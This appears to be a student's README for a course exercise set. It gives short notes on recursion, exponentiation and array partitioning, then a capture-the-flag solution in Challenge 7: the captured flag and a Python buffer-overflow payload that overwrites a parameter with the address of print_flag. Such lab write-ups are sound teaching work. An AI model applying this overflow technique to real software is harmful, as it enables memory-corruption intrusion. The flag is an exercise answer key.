Copyright 2022 Maria Sfiraiala (maria.sfiraiala@stud.acs.upb.ro)

# Summer Advent - Day 2

-------------------------------------------------------------------------------

## Challenge5
### a)
- We first analyse the four main cases: n = 0, 1, 2 ,3.
- We then call the function after decrementing its parameter step by step.

### b)
- We check whether the exponent is 0, if so, the recursion stops and we return.
- Otherwise, we check if the exponent is odd or even and based on this
information we either call f(a, b - 1) and multiply the result by a, or call 
f(a, b / 2) and multiply the result by itself.

-------------------------------------------------------------------------------

## Challenge6
- We read n and k in main, we'll read v in the partition function.
- In the partition function we allocate space for v and we read its values.
- We allocate space for the result.
- We iterate 2 times through v in order to partition the values correctly.

-------------------------------------------------------------------------------

## Challenge7
- NICE_FLAG{3234ca4d959ec85b440d8089ec03baa0}
- In order to reach the flag we had to get through 5 functions, for which we
sent the necessary number of bytes, required by every read().
- The sixth function had its  third parameter overwritten with the address
of the print_flag function we wanted to call.
- The exploit:
```
    import sys
    import struct

    offset = 273 + 0x152 + 0x80 + 0x77 + 0xde + 0x7e
    address = 0x080485b1

    payload = offset * b'A' + struct.pack("<I", address)
    sys.stdout.buffer.write(payload)
```